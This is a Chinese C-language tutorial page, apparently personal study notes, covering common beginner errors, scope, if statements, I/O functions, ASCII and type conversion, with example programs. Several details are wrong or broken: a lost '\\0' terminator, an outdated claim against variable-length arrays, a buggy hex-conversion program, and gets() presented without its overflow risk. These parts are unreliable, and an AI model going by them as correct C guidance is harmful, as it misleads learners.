<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">main() </span><br><span class="line">&#123; </span><br><span class="line">int a&#x3D;5; </span><br><span class="line">printf(&quot;%d&quot;,A); </span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure></div>

<p>　　编译程序把a和A认为是两个不同的变量名，而显示出错信息。C认为大写字母和小写字母是两个不同的字符。习惯上，符号常量名用大写，变量名用小写表示，以增加可读性。<br>　　2.忽略了变量的类型，进行了不合法的运算。</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">main() </span><br><span class="line">&#123; </span><br><span class="line">float a,b; </span><br><span class="line">printf(&quot;%d&quot;,a%b); </span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure></div>

<p>　　%是求余运算，得到a/b的整余数。整型变量a和b可以进行求余运算，而实型变量不允许进行“求余”运算。<br>　　3.将字符常量与字符串常量混淆。<br>　　char c;<br>　　c=”a”;<br>　　在这里就混淆了字符常量与字符串常量，字符常量是由一对单引号括起来的单个字符，字符串常量是一对双引号括起来的字符序列。C规定以“\”作字符串结束标志，它是由系统自动加上的，所以字符串“a”实际上包含两个字符：‘a’和‘&#39;，而把它赋给一个字符变量是不行的。<br>　　4.忽略了“=”与“==”的区别。<br>　　在许多高级语言中，用“=”符号作为关系运算符“等于”。如在BASIC程序中可以写if (a=3) then …但C语言中，“=”是赋值运算符，“==”是关系运算符。如：<br>　　if (a==3) a=b;前者是进行比较，a是否和3相等，后者表示如果a和3相等，把b值赋给a。由于习惯问题，初学者往往会犯这样的错误。<br>　　5.忘记加分号。<br>　　6.多加分号。<br>　　7.输入变量时忘记加地址运算符“&amp;”。<br>　　int a,b;<br>　　scanf(“%d%d”,a,b);<br>　　这是不合法的。Scanf函数的作用是：按照a、b在内存的地址将a、b的值存进去。“&amp;a”指a在内存中的地址。<br>　　8.输入数据的方式与要求不符。<br>　　①scanf(“%d%d”,&amp;a,&amp;b);输入时，不能用逗号作两个数据间的分隔符，如下面输入不合法：3，4输入数据时，在两个数据之间以一个或多个空格间隔，也可用回车键，跳格键tab。<br>　　②scanf(“%d,%d”,&amp;a,&amp;b);C规定：如果在“格式控制”字符串中除了格式说明以外还有其它字符，则在输入数据时应输入与这些字符相同的字符。下面输入是合法的：<br>　　3，4此时不用逗号而用空格或其它字符是不对的。<br>　　3 4 3：4<br>　　又如：scanf(“a=%d,b=%d”,&amp;a,&amp;b);输入应如以下形式：a=3,b=4<br>　　9.输入字符的格式与要求不一致。<br>　　在用“%c”格式输入字符时，“空格字符”和“转义字符”都作为有效字符输入。<br>　　scanf(“%c%c%c”,&amp;c1,&amp;c2,&amp;c3);如输入a b c字符“a”送给c1，字符“ ”送给c2，字符“b”送给c3，因为%c只要求读入一个字符，后面不需要用空格作为两个字符的间隔。<br>　　10.输入输出的数据类型与所用格式说明符不一致。<br>　　例如，a已定义为整型，b定义为实型，a=3;b=4.5;printf(“%f%d\n”,a,b);编译时不给出出错信息，但运行结果将与原意不符。这种错误尤其需要注意。<br>　　11.输入数据时，企图规定精度。scanf(“%7.2f”,&amp;a);这样做是不合法的，输入数据时不能规定精度。<br>　　12.switch语句中漏写break语句。<br>　　例如：根据考试成绩的等级打印出百分制数段。</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">switch(grade)</span><br><span class="line">&#123; case &#39;A&#39;:printf(&quot;85~100\n&quot;);</span><br><span class="line">  case &#39;B&#39;:printf(&quot;70~84\n&quot;);</span><br><span class="line">  case &#39;C&#39;:printf(&quot;60~69\n&quot;);</span><br><span class="line">  case &#39;D&#39;:printf(&quot;&lt;60\n&quot;);</span><br><span class="line">  default:printf(&quot;error\n&quot;);</span><br></pre></td></tr></table></figure></div>

<p>　　由于漏写了break语句，case只起标号的作用，而不起判断作用。因此，当grade值为A时，printf函数在执行完第一个语句后接着执行第二、三、四、五个printf函数语句。正确写法应在每个分支后再加上“break;”。例如case ‘A’:printf(“85~100\n”);break;<br>　　13.忽视了while和do-while语句在细节上的区别。因为while循环是先判断后执行，而do-while循环是先执行后判断。<br>　　14.定义数组时误用变量。</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">int n;</span><br><span class="line">scanf(&quot;%d&quot;,&amp;n);</span><br><span class="line">int a[n];</span><br></pre></td></tr></table></figure></div>

<p>　　数组名后用方括号括起来的是常量表达式，可以包括常量和符号常量。即C不允许对数组的大小作动态定义。<br>　　15.在定义数组时，将定义的“元素个数”误认为是可使的最大下标值。</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">main()</span><br><span class="line">&#123;static int a[10]&#x3D;&#123;1,2,3,4,5,6,7,8,9,10&#125;;</span><br><span class="line">printf(&quot;%d&quot;,a[10]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>　　C语言规定：定义时用a[10]，表示a数组有10个元素。其下标值由0开始，所以数组元素a[10]是不存在的。<br>　　16.在不应加地址运算符&amp;的位置加了地址运算符。scanf(“%s”,&amp;str);C语言编译系统对数组名的处理是：数组名代表该数组的起始地址，且scanf函数中的输入项是字符数组名，不必要再加地址符&amp;。应改为：scanf(“%s”,str);<br>　　17.同时定义了形参和函数中的局部变量。</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">int max(x,y)</span><br><span class="line">int x,y,z;</span><br><span class="line">&#123;z&#x3D;x&gt;y?x:y;</span><br><span class="line">return(z);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>　　形参应该在函数体外定义，而局部变量应该在函数体内定义。应改为：</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">int max(x,y)</span><br><span class="line">int x,y;</span><br><span class="line">&#123;int z;</span><br><span class="line">z&#x3D;x&gt;y?x:y;</span><br><span class="line">return(z);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
</blockquote>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="C"><figure class="iseeu highlight /c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> iNumber1=<span class="number">1</span>;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"%d\n"</span>,iNumber1);</span><br><span class="line">	<span class="keyword">if</span>(iNumber1&gt;<span class="number">0</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">int</span> iNumber1=<span class="number">2</span>;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"%d\n"</span>,iNumber1);</span><br><span class="line">		<span class="keyword">if</span>(iNumber1&gt;<span class="number">0</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">int</span> iNumber1=<span class="number">3</span>;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">"%d\n"</span>,iNumber1);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"%d\n"</span>,iNumber1);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p>1<br>2<br>3<br>2</p>
</blockquote>
<blockquote>
<p>　<strong>1.在主函数main中，定义了第一个整形变量，为其赋值为1，赋值后使用printf函数输出变量。在程序的运行结果中可以看到，此时的iNumber的值为1</strong><br>　<strong>2.使用if语句进行判断，这里使用if语句的目的在于划分出一段语句块。因为位于不同作用域的变量可以使用相同的标示符，所以在if语句块中也定义一个iNumber变量，并为其赋值为2.再次使用printf函数输出变量，观察运行结果，发现第二个输出的值为2.此时值为2的变量在此作用域中就将值为1的变量屏蔽掉。</strong></p>
</blockquote>
<h1 id="IF语句"><a href="#IF语句" class="headerlink" title="IF语句"></a>IF语句</h1><blockquote>
<p> <strong>语法格式为：</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">if(表达式)  </span><br><span class="line">　　语句1；  </span><br><span class="line">　　else  </span><br><span class="line">　　语句2；  </span><br><span class="line">　　语句3；</span><br></pre></td></tr></table></figure></div>

<p>　　NS图表示如下：</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">　　             |------------|  </span><br><span class="line">　　             |   表达式   |  </span><br><span class="line">　　             |------|-----|  </span><br><span class="line">　　             |  真  |  假 |  </span><br><span class="line">　　             |------|-----|  </span><br><span class="line">　　             |语句1 |语句2|  </span><br><span class="line">　　             |------------|  </span><br><span class="line">　　             |   语句3    |  </span><br><span class="line">　　             |------------|</span><br></pre></td></tr></table></figure></div>
</blockquote>
<blockquote>
<p>　 <strong>语句解释：对表达式1进行判断，结果为真（非0）时则执行语句1，若为假（为0）则执行语句2，完成执行后退出if并执行if后的语句3。</strong></p>
</blockquote>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="C"><figure class="iseeu highlight /c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span>    </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> a=<span class="number">3</span>,b=<span class="number">2</span>,c=<span class="number">1</span>;     <span class="comment">//输入a,b,c三个数</span></span><br><span class="line">	system(<span class="string">"cls"</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"[1]: %d, %d, %d\n"</span>, a, b, c);  </span><br><span class="line">	&#123;</span><br><span class="line">			<span class="keyword">int</span> b=<span class="number">5</span>;  </span><br><span class="line">			<span class="keyword">int</span> c=<span class="number">12</span>;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">"[2]: %d,%d,%d\n"</span>,a,b,c); </span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"[3] %d,%d,%d,"</span>,a,b,c); </span><br><span class="line">	 <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p>[1]: 3, 2, 1</p>
<p>3,5,12</p>
<p>[3] 3,2,1</p>
</blockquote>
<h1 id="基本的输入与输出"><a href="#基本的输入与输出" class="headerlink" title="基本的输入与输出"></a>基本的输入与输出</h1><blockquote>
<p><code>int scanf(const char \*format, arg_list)</code><br>　　scanf主要从标准输入流中获取参数值,format为指定的参数格式及参数类型,如<code>scanf(&quot;%s,%d&quot;,str,icount);</code><br>　　它要求在标准输入流中输入类似”son of bitch,1000”这样的字符串,同时程序会将”son of bitch”给str,1000给icount.<br>　　scanf函数的返回值为int值,即成功赋值的个数,在上例中如果函数调用成功,则会返回2,所以我们在写程序时,可以通过<br>　　语句<code>if(scanf(&quot;%s,%d&quot;,str,icount) != 2){...}</code>来判断用户输入是否正确.</p>
<p>　　<code>int printf(const char *format, arg_list)</code><br>　　printf主要是将格式化字符串输出到标准输出流中,在stdio.h头文件中定义了标准的输入和输出,分别是stdin,stdout.<br>　　arg_list可以是变量名,也可以是表达式,但最终都会以值的形式填充进format中.</p>
<p>　　<code>int getc(FILE \*fp)</code><br>　　getc主要是从文件中读出一个字符.常用的判断文件是否读取结束的语句为:<code>(ch = getc(fp)) != EOF</code>,EOF为文件结束标志,定义在stdio.h中,就像<code>EXIT_SUCCESS,EXIT_FAILURE</code>定义在stdlib.h中一样,文件也可以被理解为一种流,所以当fp为<code>stdin时,getc(stdin)</code>就等同于getchar()了.</p>
<p>　　<code>int putc(int ch,FILE \*fp)</code><br>　　putc主要是把字符ch写到文件fp中去.如果fp为stdout,则putc就等同于putchar()了.</p>
<p>　　<code>int getchar(void)</code><br>　　getchar主要是从标准输入流读取一个字符.默认的标准输入流即stdio.h中定义的stdin.但是从输入流中读取字符时又涉及到缓冲的问题,所以并不是在屏幕中敲上一个字符程序就会运行,一般是通过在屏幕上敲上回车键,然后将回车前的字符串放在缓冲区中,getchar就是在缓冲区中一个一个的读字符.当然也可以在while循环中指定终止字符,如下面的语句: <code>while ((c = getchar()) != &#39;#&#39;)</code>这是以#来结束的.</p>
<p>　　<code>int putchar(int ch)</code><br>　　putchar(ch)主要是把字符ch写到标准流stdout中去.</p>
<p>　　<code>char * gets(char \*str)</code><br>　　gets主要是从标准输入流读取字符串并回显，读到换行符时退出,并会将换行符省去.</p>
<p>　　<code>int puts(char \*str)</code><br>　　puts主要是把字符串str写到标准流stdout中去,并会在输出到最后时添加一个换行符.</p>
<p>　　<code>char *fgets(char \*str, int num, FILE \*fp)</code><br>　　str是存放读入的字符数组指针,num是最大允许的读入字符数,fp是文件指针.fgets的功能是读一行字符，该行的字符数不大于num-1.因为fgets函数会在末尾加上一个空字符以构成一个字符串.另外fgets在读取到换行符后不会将其省略.</p>
<p>　　<code>int fputs(char \*str, file *fp)</code><br>　　fputs将str写入fp.fputs与puts的不同之处是fputs在打印时并不添加换行符.</p>
<p>　　<code>int fgetc(FILE \*fp)</code><br>　　fgetc从fp的当前位置读取一个字符.</p>
<p>　　<code>int fputc(int ch, file \*fp)</code><br>　　fputc是将ch写入fp当前指定位置.</p>
<p>　　<code>int fscanf(FILE \*fp, char \*format,...)</code><br>　　fscanf按照指定格式从文件中出读出数据,并赋值到参数列表中.</p>
<p>　　<code>int fprintf(FILE \*fp, char \*format,...)</code><br>　　fprintf将格式化数据写入流式文件中. 　　</p>
</blockquote>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="C"><figure class="iseeu highlight /c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;       </span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span>  </span></span><br><span class="line"><span class="function"></span>&#123;  </span><br><span class="line"><span class="comment">//定义3个字符变量并初始化  </span></span><br><span class="line">	<span class="keyword">char</span> a=<span class="string">'B'</span>,b=<span class="string">'0'</span>, c=<span class="string">'Y'</span>;</span><br><span class="line"><span class="comment">//向显示器输出字符B  </span></span><br><span class="line">	<span class="built_in">putchar</span>(a);</span><br><span class="line">	<span class="built_in">putchar</span>(b);</span><br><span class="line">	<span class="built_in">putchar</span>(c);</span><br><span class="line">	<span class="built_in">putchar</span>(<span class="string">'\n'</span>);</span><br><span class="line"><span class="comment">//向显示器输出字符O  </span></span><br><span class="line"><span class="comment">//向显示器输出字符Y  </span></span><br><span class="line"><span class="comment">//向显示器输出一个换行符  </span></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure></div>

<p><img src="https://i.loli.net/2021/05/22/QbUY1hGr38xzVDJ.png" alt="image-20210522095120230"></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="C"><figure class="iseeu highlight /c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">　　  <span class="keyword">char</span> a,b,c;     <span class="comment">//定义字符变量a,b,c  </span></span><br><span class="line">a=getchar();    <span class="comment">//从键盘输入一个字符，送给字符变量a  </span></span><br><span class="line">b=getchar();    <span class="comment">//从键盘输入一个字符，送给字符变量b  </span></span><br><span class="line">c=getchar();    <span class="comment">//从键盘输入一个字符，送给字符变量c  </span></span><br><span class="line"><span class="built_in">putchar</span>(a);     <span class="comment">//将变量a的值输出  </span></span><br><span class="line"><span class="built_in">putchar</span>(b);      <span class="comment">//将变量b的值输出  </span></span><br><span class="line"><span class="built_in">putchar</span>(c);       <span class="comment">//将变量c的值输出  </span></span><br><span class="line"><span class="built_in">putchar</span>(<span class="string">'\n'</span>);    <span class="comment">//换行  </span></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><img src="https://i.loli.net/2021/05/22/phaf6dYMQFb5u4x.png" alt="image-20210522095635397"></p>
<h1 id="ASCII码"><a href="#ASCII码" class="headerlink" title="ASCII码"></a>ASCII码</h1><blockquote>
<p>ASCII ((American Standard Code for Information Interchange): 美国信息交换标准代码）是基于拉丁字母的一套电脑编码系统，主要用于显示现代英语和其他西欧语言。它是最通用的信息交换标准，并等同于国际标准ISO/IEC 646。ASCII第一次以规范标准的类型发表是在1967年，最后一次更新则是在1986年，到目前为止共定义了128个字符。<br>　　ASCII 码使用指定的7 位或8 位二进制数组合来表示128 或256 种可能的字符。标准ASCII 码也叫基础ASCII码，使用7 位二进制数（剩下的1位二进制为0）来表示所有的大写和小写字母，数字0 到9、标点符号，以及在美式英语中使用的特殊控制字符 。其中：<br>　　0～31及127(共33个)是控制字符或通信专用字符（其余为可显示字符），如控制符：LF（换行）、CR（回车）、FF（换页）、DEL（删除）、BS（退格)、BEL（响铃）等；<br>　　通信专用字符：SOH（文头）、EOT（文尾）、ACK（确认）等；<br>　　ASCII值为8、9、10 和13 分别转换为退格、制表、换行和回车字符。它们并没有特定的图形显示，但会依不同的应用程序，而对文本显示有不同的影响。<br>　　32～126(共95个)是字符(32是空格），其中48～57为0到9十个阿拉伯数字。<br>　　65～90为26个大写英文字母，97～122号为26个小写英文字母，其余为一些标点符号、运算符号等。<br>　　同时还要注意，在标准ASCII中，其最高位(b7)用作奇偶校验位。所谓奇偶校验，是指在代码传送过程中用来检验是否出现错误的一种方法，一般分奇校验和偶校验两种。奇校验规定：正确的代码一个字节中1的个数必须是奇数，若非奇数，则在最高位b7添0；偶校验规定：正确的代码一个字节中1的个数必须是偶数，若非偶数，则在最高位b7添1。<br>后128个称为扩展ASCII码。许多基于x86的系统都支持使用扩展（或“高”）ASCII。扩展ASCII 码允许将每个字符的第8 位用于确定附加的128 个特殊符号字符、外来语字母和图形符号。</p>
</blockquote>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="C"><figure class="iseeu highlight /c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;  </span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span>  </span></span><br><span class="line"><span class="function"></span>&#123;  </span><br><span class="line">    <span class="keyword">char</span> ch = <span class="string">'A'</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%d\n"</span>,ch);　</span><br><span class="line">　　<span class="keyword">return</span> <span class="number">0</span>;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p>65</p>
</blockquote>
<h1 id="不同数据类型之间的赋值问题"><a href="#不同数据类型之间的赋值问题" class="headerlink" title="不同数据类型之间的赋值问题"></a>不同数据类型之间的赋值问题</h1><blockquote>
<ol>
<li>各类数值型数据间混合运算时的类型转换规则<br>　　整型、实型、字符型数据间可以混合运算。在这种情况下，需要将不一致的数据类型转<br>   　　换成一致的数据类型，然后进行运算。为了保证运算精度，系统在运算时的转换规则是将存储长度较短的运算对象转换成存储长度较长的类型，然后再进行处理。</li>
</ol>
</blockquote>
<blockquote>
<p><strong>如float型数据必先转换为double型数据，然后与其他操作数进行运算。与此类似，char型或short型数据必先转换为int型数据，然后进行运算。</strong></p>
</blockquote>
<blockquote>
<p><strong>如int型数据与unsigned型数据进行运算，int型转换为unsigned型后方可进行运算。int型数据与double型数据进行运算，int型直接转换为double型后进行运算，不能理解为先转换为unsigned 　　int型，然后转换为long int型，最后再转换为double型。</strong></p>
</blockquote>
<blockquote>
<p><strong>赋值时的类型转换</strong><br>　　<strong>当赋值运算符两侧的类型不同时，需进行类型转换，这种转换也是系统自动进行的。具体转换原则如下：</strong><br>　　<strong>1）float、double型赋值给int型：直接截断小数。</strong><br>　　<strong>例如：int i=f+0.6; f的值4.0，右边算术表达式运算后的结果为一个值为4.6的double型数据，根据上述转换原则，直接舍弃小数，所以i的值为4。</strong><br>　　<strong>2）int、char型赋值给float、double型：补足有效位以进行数据类型转换。</strong><br>　　<strong>例如：float f=4; float为7位有效数字，所以f的值为4.000000。</strong><br>　　<strong>3）char型（1字节）赋值给int型（2字节）：数值赋给int的低8位，高8位补0。</strong><br>　　<strong>4）long int型赋值给int型：long int截断低字节给int型。</strong><br>　　<strong>5）int 型赋值给long int：赋给long int的低16位，如果int的最高位是0，则long int的高16位全为0；如果int的最高位是1，则long int的高8位全为1（称为“符号扩展”）。</strong><br>　　<strong>6）unsigned int型赋值给int型：直接传送数值。</strong><br>　　<strong>7）非unsigned数据型赋值给位数相同的unsigned 数据：直接传送数值</strong><br>　　<strong>强制类型转换</strong><br>　　<strong>除了以上的两种自动类型转换外，在C语言中，允许强制类型转换，将某一数据的数据类型转换为指定的另一种数据类型。强制转换是用强制转换运算符进行的，强制转换运算符为：（类型名），强制转换运算符组成的运算表达式的一般形式为：</strong><br>　　<strong>(类型名)(表达式)</strong><br>　　<strong>例如：</strong><br>　　<strong>(int)(x + y) //将x+y的值转换成整型，即取整数部分。</strong><br>　　<strong>(float)x + y //将x转换成单精度型。</strong></p>
<hr>
<p>　　<strong>强制转换运算符优先级比算术运算符高。同表达式中数据类型的自动转换一样，强制类型转换也是临时转换，对原运算对象的类型没有影响。</strong><br>　　<strong>例如，已知有变量定义：int b=7;float a=2.5,c=4.7;求下面算术表达式的值。</strong><br>　　a+(int)(b/3<em>(int)(a+c)/2.0)%4；<br>　　根据运算符结合性规则，上述表达式要自左之右执行，b/3为2，2</em>int(a+c)为14，14/2.0为7.0，强制类型转换后为7，7%4为3；a的值2.5与3相加，最终结果为5.5。** 　　</p>
</blockquote>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="C"><figure class="iseeu highlight /c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;  </span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span>  </span></span><br><span class="line"><span class="function"></span>&#123;  </span><br><span class="line">	<span class="keyword">float</span> a,b,c,t;</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">"%f,%f,%f"</span>,&amp;a,&amp;b,&amp;c);  </span><br><span class="line">	<span class="keyword">if</span>(a&gt;b) </span><br><span class="line">	&#123;</span><br><span class="line">		t=a;</span><br><span class="line">		a=b;</span><br><span class="line">		b=t;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>(a&gt;c)</span><br><span class="line">	&#123;</span><br><span class="line">		t=a;</span><br><span class="line">		a=c;</span><br><span class="line">		c=t;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>(b&gt;c)</span><br><span class="line">	&#123;</span><br><span class="line">		t=b;</span><br><span class="line">		b=c;</span><br><span class="line">		c=t;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"%5.2f,%5.2f,%5.2f\n"</span>,a,b,c);  <span class="comment">//顺序输出a,b,c的值  </span></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><img src="https://i.loli.net/2021/05/22/TDXu2HJjqo6IYZM.png" alt="image-20210522100659969"></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">int power(int n) &#x2F;&#x2F; 编写计算16的n次方的函数</span><br><span class="line">&#123;</span><br><span class="line">	int i;</span><br><span class="line">	int s&#x3D;1;</span><br><span class="line">	for(i&#x3D;1;i&lt;&#x3D;n;i++)</span><br><span class="line">	&#123;</span><br><span class="line">		s&#x3D;s*16;</span><br><span class="line">	&#125;</span><br><span class="line">	return s;</span><br><span class="line">&#125;</span><br><span class="line">void main()</span><br><span class="line">&#123;</span><br><span class="line">	int m;&#x2F;&#x2F;定义变量m存放16进制数</span><br><span class="line">	int n;&#x2F;&#x2F;定义变量n存放10进制数</span><br><span class="line">	int i;&#x2F;&#x2F;定义变量i记录指数  </span><br><span class="line">	int r;&#x2F;&#x2F;定义变量r记录16进制数的某位的数 </span><br><span class="line">	printf(&quot;please enter a hexadecimal number 16:&quot;);  &#x2F;&#x2F;请输入一个16进制数:</span><br><span class="line">	scanf(&quot;%d&quot;,&amp;m);&#x2F;&#x2F;用m接受用户输入的16进制数  </span><br><span class="line">	n&#x3D;0;</span><br><span class="line">	i&#x3D;0;</span><br><span class="line">	while(m)</span><br><span class="line">	&#123;</span><br><span class="line">		r&#x3D;m%10;</span><br><span class="line">		n&#x3D;n+r*power(i);</span><br><span class="line">		m&#x3D;m&#x2F;10;</span><br><span class="line">		i++;</span><br><span class="line">	&#125;</span><br><span class="line">	printf(&quot;16 hexadecimal number%d correspinding to 10 hexadecimal numbe is :%d\n&quot;,m,n); &#x2F;&#x2F;16进制数%d对应的10进制数是</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><img src="https://i.loli.net/2021/05/22/zSJk9LPHq4iO8j6.png" alt="image-20210522102021563"></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="C"><figure class="iseeu highlight /c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">      <span class="keyword">int</span> i=<span class="number">1</span>,sum=<span class="number">0</span>;      <span class="comment">//定义变量i的初始值为1，sum的初始值为0</span></span><br><span class="line">      <span class="keyword">while</span>(i&lt;=<span class="number">100</span>)      <span class="comment">//当i&gt;100，条件表达式i&lt;=100的值为假，不执行循环体</span></span><br><span class="line">      &#123;             <span class="comment">//循环体开始</span></span><br><span class="line">       sum=sum+i;       <span class="comment">//第一次累加后，sum的值为1</span></span><br><span class="line">       i++;          <span class="comment">//加完后，i的值加1，为下次累加做准备</span></span><br><span class="line">       &#125;                     <span class="comment">//循环体结束</span></span><br><span class="line">       <span class="built_in">printf</span>(<span class="string">"sum=%d\n"</span>,sum);<span class="comment">//输出1+2+3+...+100的累加和</span></span><br><span class="line">       <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></div>

<h1 id="while"><a href="#while" class="headerlink" title="while"></a>while</h1><blockquote>
